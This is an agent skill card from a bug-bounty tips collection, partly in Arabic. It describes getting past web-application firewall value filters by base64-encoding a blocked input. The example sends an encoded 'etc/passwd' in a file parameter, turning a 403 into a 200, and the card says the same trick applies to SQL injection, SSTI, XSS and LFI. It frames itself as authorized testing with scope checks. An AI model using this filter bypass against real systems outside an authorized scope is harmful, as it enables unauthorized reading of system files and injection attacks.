# SKILL: Bypass فلاتر القيم بالـ Base64 Encoding (SQL/SSTI/XSS/LFI)

**Skill id:** `tip/bypass-فلاتر-القيم-بالـ-base64-encoding-sqlsstixsslfi`  
**Category:** General, WAF Bypass  
**Rating:** 🔥 قوية  
**Status:** Not started  
**Notion:** https://app.notion.com/p/3dddac31e88081ef84f2ce9b89330e4f  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **General, WAF Bypass**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

بعض الفلاتر بتدور على قيم (strings) معينة zي أسماء ملفات النظام أو الكلمات المحظورة، لو encode القيمة بـ base64 قبل ما تحطها في الباراميتر، الفلتر مش بيعرفها فبيسمحلها تعدي، لحد ما تتفك جوه الباكيند.

## Payload / Code

```
url/?f=etc/passwd → 403 (محظور)

encode etc/passwd كـ base64: L2V0Yy9wYXNzd2Q=

url/?f=L2V0Yy9wYXNzd2Q= → 200 ✅

#note: التقنية دي قابلة للاستخدام في SQL, SSTI, XSS, LFI وغيرها
```

## Source

kjulius @ethical\_h4ck3r\_ (Pinned) — Credit: @GodfatherOrwa

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
